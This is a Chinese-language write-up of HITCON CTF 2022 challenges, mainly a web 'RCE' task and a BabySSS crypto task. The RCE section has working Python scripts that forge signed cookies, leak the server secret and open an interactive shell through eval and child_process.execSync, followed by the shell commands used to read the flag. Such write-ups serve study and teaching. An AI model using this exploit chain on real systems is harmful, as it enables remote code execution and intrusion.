# HITCON CTF
###### tags: `CTF`

## Misc
### Welcome
![](https://i.imgur.com/tCqj65m.png)

登 twitter -> 發一篇廢文標註 `#HITCONCTF2022` -> discord welcome channel 送網址 -> tada

![](https://i.imgur.com/LIHDV5o.png)

hitcon{we filled twitter with more spam tweets}

### (X)LemWinx
![](https://i.imgur.com/U9nzMGO.png)
[解題相關連結](https://gist.github.com/maple3142/da3b89c89e16707101f2c7eaf1481771)

然後就卡住了
![](https://i.imgur.com/3wrePMJ.png)
![](https://i.imgur.com/Vkg8k32.png)

## Web
### RCE
![](https://i.imgur.com/bzWyXC9.png)

:::spoiler Dockerfile
```dockerfile=
FROM node:latest

COPY app /www
WORKDIR /www

RUN npm install
RUN echo "hitcon{REDACTED}" > "/flag-$(head -c 32 /dev/random | sha1sum | cut -d ' ' -f 1 | tr -d '\n')"

ARG AUTO_DESTROY
ENV AUTO_DESTROY=$AUTO_DESTROY
CMD ["bash", "-c", "timeout $(($AUTO_DESTROY*60)) node app.js"]
```
:::

首先在 Dockerfile 中可以看到，flag 在檔案中且名稱未知，基本上需要 RCE 才能拿到 flag

:::spoiler app.js
```javascript=
const express = require('express');
const cookieParser = require('cookie-parser')
const crypto = require('crypto');

const randomHex = () => '0123456789abcdef'[~~(Math.random() * 16)];

const app = express();
const secret = crypto.randomBytes(20).toString('hex')
app.use(cookieParser(secret));

app.get('/', function (_, res) {
    res.cookie('code', '', { signed: true })
        .sendFile(__dirname + '/index.html');
});

app.get('/random', function (req, res) {
    console.log(req.cookies.code);
    console.log(req.signedCookies.code);
    console.log(req.secret);
    console.log(secret);
    let result = null;
    if (req.signedCookies.code.length >= 40) {
        const code = Buffer.from(req.signedCookies.code, 'hex').toString();
        try {
            result = eval(code);
        } catch {
            result = '(execution error)';
        }
        res.cookie('code', '', { signed: true })
            .send({ progress: req.signedCookies.code.length, result: `Executing '${code}', result = ${result}` });
    } else {
        res.cookie('code', req.signedCookies.code + randomHex(), { signed: true })
            .send({ progress: req.signedCookies.code.length, result });
    }
});

app.listen(5000);
```
:::

在 app.js 中有一個明顯的 eval 函式，可以幫我們執行 js code，也就可以進行 RCE

不過，如果要使用到 eval，會需要一個長達 20 byte (40 個 hex) 簽章過的 cookie，而簽章的 secret 未知，而會進行簽章的地方基本上也只有 /random endpoint 中 else 區塊的 `req.signedCookies.code + randomHex()`

而由於檢查過相關版本函式庫接是最新，應該是沒有 vulnerability，且 HMAC 相關演算法也沒有聽過甚麼神奇的繞過方法

在一陣推敲後，靈光乍現想到我們可以控制是否要送 cookie 資料，因此 randomHex 新增加的 hex 就是我們可以控制的了 (就某種意義上來說，lnfinite monkey theorem 這個提示真的確實有點用，總之就是讓他一直生 byte 出來)

因此，我們也就可以使用到 eval，雖然說控制長度只有 20 byte

:::spoiler POC
```python=
import requests

payload_demand = b"1+1//"
payload_demand += bytes([0 for _ in range(20 - len(payload_demand))])
payload_demand = payload_demand.hex()

url = "http://localhost:5000"
res1 = requests.get(url)
cookie = res1.cookies["code"]

i = 0
while(i < len(payload_demand)):
    res = requests.get(f"{url}/random", cookies={"code":cookie})
    temp_cookie = res.cookies["code"]
    ck = temp_cookie[4:].split('.')[0]
    if(ck[-1] == payload_demand[i]):
        print(temp_cookie, payload_demand)
        cookie = temp_cookie
        i += 1

res = requests.get(f"{url}/random", cookies={"code":cookie})
print(res.text)
```
:::

預期結果會出現 `2`

而稍微搜尋一下，發現基本上無論是讀檔或是執行命令的 payload 都超長ㄉ，20 byte 根本不夠用，因此需要想辦法增強控制範圍

一個想法是，可以偷偷看簽章的 secret 資料，想法看起來可行

搜尋了一下後，發現簽章的 secret 會在每次 request 的時候放到 `req.secret` 中，長度很短，因此只要向前面一樣偷出來就可以了

:::spoiler POC2
```python=
import requests

payload_demand = b"req.secret//"
payload_demand += bytes([0 for _ in range(20 - len(payload_demand))])
payload_demand = payload_demand.hex()

url = "http://localhost:5000"
res1 = requests.get(url)
cookie = res1.cookies["code"]

i = 0
while(i < len(payload_demand)):
    res = requests.get(f"{url}/random", cookies={"code":cookie})
    temp_cookie = res.cookies["code"]
    ck = temp_cookie[4:].split('.')[0]
    if(ck[-1] == payload_demand[i]):
        print(temp_cookie, payload_demand)
        cookie = temp_cookie
        i += 1

res = requests.get(f"{url}/random", cookies={"code":cookie})
secret_key = res.json()['result'].split('result = ')[1]
print(f"leaked key = {secret_key}")
```
:::

偷出來之後，接下來就是簽章了，查詢了一下 cookie-parser 使用的簽章函式庫是 cookie-signature，而其中預設參數是使用 HMAC-SHA256 加上 base64 產生而成

![](https://i.imgur.com/pEXRlCb.png)

因此依樣畫葫蘆，照著簽就可以了

以下我稍微改良做了一個互動式的 shell，以方便使用

:::spoiler solve.py
```python=
import requests
from base64 import b64encode
import hmac

payload_demand = b"req.secret//"
payload_demand += bytes([0 for _ in range(20 - len(payload_demand))])
payload_demand = payload_demand.hex()

# url = "http://localhost:5000"
url = "http://1ybm2d4s7i.rce.chal.hitconctf.com/"
res1 = requests.get(url)
cookie = res1.cookies["code"]

i = 0
while(i < len(payload_demand)):
    res = requests.get(f"{url}/random", cookies={"code":cookie})
    temp_cookie = res.cookies["code"]
    ck = temp_cookie[4:].split('.')[0]
    if(ck[-1] == payload_demand[i]):
        print(temp_cookie, payload_demand)
        cookie = temp_cookie
        i += 1

res = requests.get(f"{url}/random", cookies={"code":cookie})
secret_key = res.json()['result'].split('result = ')[1]
print(f"leaked key = {secret_key}")

while(True):
    # execute command: require("child_process").execSync("ls -al", {'encoding':'utf8'})
    command = input("input command > ").encode().hex()
    if(len(command) < 40):
        command += '//'.encode().hex()
    while(len(command) < 40):
        command += '00'
    signature = b64encode(hmac.new(secret_key.encode(), msg=command.encode(), digestmod='sha256').digest()).decode().strip('=')

    cookie = f"s:{command}.{signature}"
    res = requests.get(f"{url}/random", cookies={"code":cookie})
    print(res.text)
```
:::

而 nodejs 中執行 shell 指令的程式看起來像是這樣 `require("child_process").execSync("ls -al", {'encoding':'utf8'})`，照著填入即可

以下是我取得 flag 所下的指令順序
```javascript=
require("child_process").execSync("ls -al /", {'encoding':'utf8'})
require("child_process").execSync("cat /flag-1e5657085ea974db77cdef03cc5753833fea1668", {'encoding':'utf8'})
```

flag gatcha

![](https://i.imgur.com/9onvzaU.png)

hitcon{random cat executionnnnnnn}

## Reverse
### (X)checker
- Main Func(有稍微Patch過，原為DeviceIoControl(_DAT_140003620))
![](https://i.imgur.com/BONmLX8.png)


## Crypto
### (X) ㊙️ BabySSS
![](https://i.imgur.com/giLtGv1.png)

:::spoiler chall.py
```python=
from random import SystemRandom
from Crypto.Cipher import AES
from hashlib import sha256
from secret import flag

rand = SystemRandom()


def polyeval(poly, x):
    return sum([a * x**i for i, a in enumerate(poly)])


DEGREE = 128
SHARES_FOR_YOU = 8  # I am really stingy :)

poly = [rand.getrandbits(64) for _ in range(DEGREE + 1)]
shares = []
for _ in range(SHARES_FOR_YOU):
    x = rand.getrandbits(16)
    y = polyeval(poly, x)
    shares.append((x, y))
print(shares)

secret = polyeval(poly, 0x48763)
key = sha256(str(secret).encode()).digest()[:16]
cipher = AES.new(key, AES.MODE_CTR)
print(cipher.encrypt(flag))
print(cipher.nonce)

```
:::

可以看到，題目首先生成一個 128 次多項式，並用來產生加密的 secret 參數，此外也很好心的給了 8 個 x,y 對

不過根據 [Shamir's Secret Sharing](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing) 的介紹，至少需要 129 個 x,y 對才能生成回原本的多項式，因此只有 8 個基本上是還原不回來

根據嘗試，使用一些方法像是 Lagrange 或是矩陣的最小平方法等都沒辦法產生回原本的多項式，一樣只能還原回 7 次多項式

以下參考[別人的解法](https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022/BabySSS)

從多項式公式 $f(x) = a_0 + a_1 x^1 + a_2 x^2 + \dots + a_{128} x^{128}$ 可以看到，當把 $f(x)$ 分別對每個 $x$ 對應到 $GF(x)$ 時，即可獲得 $f(x_1) \equiv a_0\ (mod\ x_1)$, $f(x_2) \equiv a_0\ (mod\ x_2)$ ... 等，亦即我們可以獲得在每個不同 $GF(x)$ 下的 $a_0$，因此我們可以透過 CRT 方法還原回 $GF(lcm(x_1, \dots x_8))$ 下的 $a_0$，而恰巧此題的 $GF(lcm(x_1, \dots x_8))$ 範圍比 $GF(2^{64})$ 還要大，因此在求出 $GF(lcm(x_1, \dots x_8))$ 範圍下的 $a_0$ 時其實就等同求出了在 $GF(2^{64})$ 下的 $a_0$，也就是原始方程式的 $a_0$

而求出了 $a_0$ 之後，也就可以將方程式降維，即 $g(x) = \frac{f(x) - a_0}{x} = a_1 + a_2 x^1 + \dots + a_{128} x^{127}$，也就可以依照之前的方法迭代下去求得方程式的所有係數

因此，有了方程式的所有係數，也就可以得出 secret 的值，進一部獲得 key 資訊，也就可以進行解密，得到 flag

完整的 script:
:::spoiler solve.py
```python=
from output import flag, shares , nonce
from hashlib import sha256
from Crypto.Cipher import AES
import Crypto.Util.number as cn
from sage.all import crt

DEGREE = 128
SHARES_FOR_YOU = 8

poly = []
shares2 = shares.copy()
for i in range(DEGREE+1):
    arg = crt([y%x for x,y in shares2], [x for x,y in shares2])
    poly.append(arg)
    assert cn.size(arg) <= 64
    shares2 = [(x, (y - arg)//x) for x,y in shares2]
print(poly)

def polyeval(poly, x):
    return sum([a * x**i for i, a in enumerate(poly)])
for i in range(SHARES_FOR_YOU):
    assert shares[i][1] == polyeval(poly, shares[i][0])

secret = polyeval(poly, 0x48763)
key = sha256(str(secret).encode()).digest()[:16]
cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)

print(cipher.decrypt(flag))
```
:::

因競賽已結束，無法確認 flag 是否正確

hitcon{doing_SSS_in_integers_is_not_good_:(}